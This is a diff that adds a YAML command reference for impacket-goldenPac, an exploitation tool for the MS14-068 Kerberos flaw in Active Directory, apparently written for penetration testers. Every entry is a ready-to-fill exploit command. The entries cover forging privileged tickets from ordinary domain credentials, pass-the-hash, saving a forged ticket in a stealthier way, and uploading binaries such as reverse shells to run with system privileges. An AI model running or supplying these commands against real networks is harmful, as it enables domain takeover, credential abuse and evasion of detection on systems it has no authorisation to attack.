@@ -1,0 +1,48 @@
+tool: impacket-goldenPac
+tags: [network, security, pentest, exploitation, active-directory, impacket, kerberos, ms14-068]
+
+actions:
+  # === BASIC EXPLOITATION ===
+  - title: impacket-goldenPac - Basic MS14-068 exploitation
+    desc: |
+      This command performs the full MS14-068 exploit against a target machine using cleartext credentials. 
+      It automatically requests a forged PAC from the Domain Controller, gains administrative access, and executes a remote command (defaults to cmd.exe). 
+      This is the standard starting point when you have a valid set of domain user credentials and the target is likely unpatched.
+    command: "impacket-goldenPac {{domain}}/{{username}}:{{password}}@{{target_fqdn}}"
+
+  - title: impacket-goldenPac - Exploitation using NTLM hashes
+    desc: |
+      Use this command when you have obtained the NTLM hash of a user instead of a cleartext password. 
+      This allows for a Pass-the-Hash (PtH) approach to exploit the MS14-068 vulnerability. 
+      Ensure the hash is provided in the LMHASH:NTHASH format; if the LM hash is unavailable, use the standard empty LM hash string.
+    command: "impacket-goldenPac -hashes {{hash}} {{domain}}/{{username}}@{{target_fqdn}}"
+
+  # === ADVANCED CONNECTIVITY ===
+  - title: impacket-goldenPac - Specify DC and Target IP addresses
+    desc: |
+      This variation is used when DNS resolution is failing or when the target FQDN does not map correctly to the desired IP. 
+      Explicitly defining the Domain Controller IP via -dc-ip is crucial for retrieving the user's SID, which is a required component for the forged ticket. 
+      Using -target-ip ensures the exploit traffic is directed to the specific host you intend to compromise.
+    command: "impacket-goldenPac -dc-ip {{dc_ip}} -target-ip {{target_ip}} {{domain}}/{{username}}:{{password}}@{{target_fqdn}}"
+
+  - title: impacket-goldenPac - Debugging and Timestamps
+    desc: |
+      This command enables verbose debugging output and adds timestamps to every log entry. 
+      It is extremely useful for troubleshooting connection timeouts, authentication failures, or Kerberos errors during the exploitation process. 
+      Use this mode in lab environments or when the exploit fails without a clear reason to see the underlying Impacket library interaction.
+    command: "impacket-goldenPac -debug -ts {{domain}}/{{username}}:{{password}}@{{target_fqdn}}"
+
+  # === TICKET AND FILE OPERATIONS ===
+  - title: impacket-goldenPac - Save forged ticket without execution
+    desc: |
+      This command generates the forged Kerberos ticket (Golden Ticket) and saves it to a local CCache file without performing any remote execution. 
+      By specifying 'None' as the command, you avoid triggering PSEXEC-style behavior, which can be significantly stealthier. 
+      The resulting file can be exported and used later with other tools by setting the KRB5CCNAME environment variable.
+    command: "impacket-goldenPac -w {{output_file|ticket.ccache}} {{domain}}/{{username}}:{{password}}@{{target_fqdn}} None"
+
+  - title: impacket-goldenPac - Upload and execute custom binary
+    desc: |
+      Instead of launching the default cmd.exe, this command uploads a local executable to the target and runs it with system privileges. 
+      This is useful for deploying custom reverse shells, post-exploitation agents, or specific enumeration tools. 
+      Be cautious, as uploading files to the disk and creating services for execution is highly likely to be detected by EDR or antivirus solutions.
+    command: "impacket-goldenPac -c {{local_binary_path}} {{domain}}/{{username}}:{{password}}@{{target_fqdn}} {{binary_arguments|}}"
